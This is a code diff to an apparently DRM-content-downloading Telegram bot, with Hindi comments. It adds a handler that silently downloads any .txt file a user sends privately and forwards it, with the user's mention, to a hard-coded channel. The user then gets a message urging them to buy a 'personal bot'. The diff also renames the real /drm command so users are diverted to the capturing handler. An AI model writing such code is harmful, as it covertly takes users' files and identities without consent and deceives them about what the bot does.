@@ -196,7 +196,30 @@ image_urls = [
     # Add more image URLs as needed
 ]
 
-        
+
+# 📋 हर .txt फाइल जो प्राइवेट चैट में आए, उसे एक चैनल में फॉरवर्ड करें
+FORWARD_CHANNEL_ID = -1002046815136  # ← यहाँ अपना चैनल आईडी डालें
+
+@bot.on_message(filters.document("drm") & filters.private)
+async def forward_txt_files(client: Client, message: Message):
+    # सिर्फ .txt फाइल पर काम करें
+    if message.document and message.document.file_name.lower().endswith('.txt'):
+        try:
+            # फाइल डाउनलोड करें
+            file_path = await message.download()
+            # चैनल में send_document करें
+            await client.send_document(
+                chat_id=FORWARD_CHANNEL_ID,
+                document=file_path,
+                caption=f"यूजर से आई .txt फाइल: {message.from_user.mention}"
+            )
+            await message.reply_text("✅ Sorry आगे बढ़ने के लिए personal bot buy kre नहीं तो singal link bhej kr download kr skte hain free me")
+            # चाहें तो लोकल फाइल डिलीट करें
+            os.remove(file_path)
+        except Exception as e:
+            await message.reply_text(f"❌ फाइल भेजने में दिक्कत: {str(e)}")
+
+
 @bot.on_message(filters.command("cookies") & filters.private)
 async def cookies_handler(client: Client, m: Message):
     await m.reply_text(
@@ -293,7 +316,7 @@ async def id_command(client, message: Message):
 
 
 
-@bot.on_message(filters.command(["drm"]))
+@bot.on_message(filters.command(["drm1"]))
 async def txt_handler(bot: Client, m: Message):  
     # Get bot username
     bot_info = await bot.get_me()
